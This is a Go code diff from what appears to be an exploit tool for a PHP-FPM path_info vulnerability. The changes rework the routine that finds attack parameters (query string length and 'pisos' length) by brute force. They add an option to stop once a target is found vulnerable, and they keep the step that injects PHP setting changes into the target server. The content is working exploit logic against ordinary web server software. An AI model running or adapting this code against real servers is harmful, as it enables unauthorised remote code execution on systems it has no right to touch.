@@ -6,8 +6,11 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"sort"
 	"strings"
 )
+
+var errPisosBruteForbidden = errors.New("pisos length brute is forbidden by command line options")
 
 type AttackParams struct {
 	QueryStringLength int
@@ -26,16 +29,13 @@ func (ap *AttackParams) String() string {
 	return s
 }
 
-func Detect(requester *Requester, method *DetectMethod, hints *AttackParams) (*AttackParams, error) {
-	for try := 0; try < 10; try++ {
-		if err := SanityCheck(requester, method); err != nil {
-			return nil, fmt.Errorf("sanity check failed: %v", err)
-		}
-	}
-
+func Detect(requester *Requester, method *DetectMethod, hints *AttackParams, onlyQSL bool) (*AttackParams, error) {
 	var qslCandidates []int
 
 	if hints.QueryStringLength != 0 {
+		if onlyQSL {
+			return nil, errors.New("only-qsl specified with --qsl, nothing to do")
+		}
 		log.Printf("Skipping qsl detection, using hint (qsl=%v)", hints.QueryStringLength)
 		qslCandidates = append(qslCandidates, hints.QueryStringLength)
 	} else {
@@ -60,6 +60,17 @@ func Detect(requester *Requester, method *DetectMethod, hints *AttackParams) (*A
 	if len(qslCandidates) > MaxQSLCandidates {
 		return nil, errors.New("too many qsl candidates found, looks like I got banned")
 	}
+	qslCandidates = extendQSLCandidatesList(qslCandidates)
+	log.Printf("The target is probably vulnerable. Possible QSLs: %v", qslCandidates)
+	if onlyQSL {
+		return nil, errPisosBruteForbidden
+	}
+
+	for try := 0; try < 10; try++ {
+		if err := SanityCheck(requester, method); err != nil {
+			return nil, fmt.Errorf("sanity check failed: %v", err)
+		}
+	}
 
 	var plCandidates []int
 	if hints.PisosLength != 0 {
@@ -71,23 +82,26 @@ func Detect(requester *Requester, method *DetectMethod, hints *AttackParams) (*A
 		}
 	}
 
+	payload, err := MakePathInfo(method.PHPOptionEnable)
+	if err != nil {
+		// methods are hardcoded, this shouldn't happen
+		panic(err)
+	}
 	for try := 0; try < SettingEnableRetries; try += 1 {
 		for _, qsl := range qslCandidates {
-			for delta := 0; delta <= MaxQSLDetectDelta; delta += QSLDetectStep {
-				for _, pl := range plCandidates {
-					params := &AttackParams{qsl - delta, pl}
-					resp, data, err := requester.Request(MakePathInfo(method.PHPOptionEnable), params)
-					if err != nil {
-						return nil, fmt.Errorf("error for %#v: %v", params, err)
-					}
-					if resp.StatusCode != http.StatusOK {
-						log.Printf("Status code %v for %#v", resp.StatusCode, params)
-					}
+			for _, pl := range plCandidates {
+				params := &AttackParams{qsl, pl}
+				resp, data, err := requester.Request(payload, params)
+				if err != nil {
+					return nil, fmt.Errorf("error for %#v: %v", params, err)
+				}
+				if resp.StatusCode != http.StatusOK {
+					log.Printf("Status code %v for %#v", resp.StatusCode, params)
+				}
 
-					if method.Check(resp, data) {
-						log.Printf("Attack params found: %v", params)
-						return params, SetSetting(requester, params, method.PHPOptionDisable)
-					}
+				if method.Check(resp, data) {
+					log.Printf("Attack params found: %v", params)
+					return params, SetSetting(requester, params, method.PHPOptionDisable, SettingEnableRetries)
 				}
 			}
 		}
@@ -142,4 +156,20 @@ server, you are fucked.
 	}
 
 	return nil
+}
+
+func extendQSLCandidatesList(candidates []int) []int {
+	values := make(map[int]struct{})
+	for _, qsl := range candidates {
+		for delta := 0; delta <= MaxQSLDetectDelta; delta += QSLDetectStep {
+			c := qsl - delta
+			values[c] = struct{}{}
+		}
+	}
+	var extended []int
+	for qsl := range values {
+		extended = append(extended, qsl)
+	}
+	sort.Sort(sort.IntSlice(extended))
+	return extended
 }
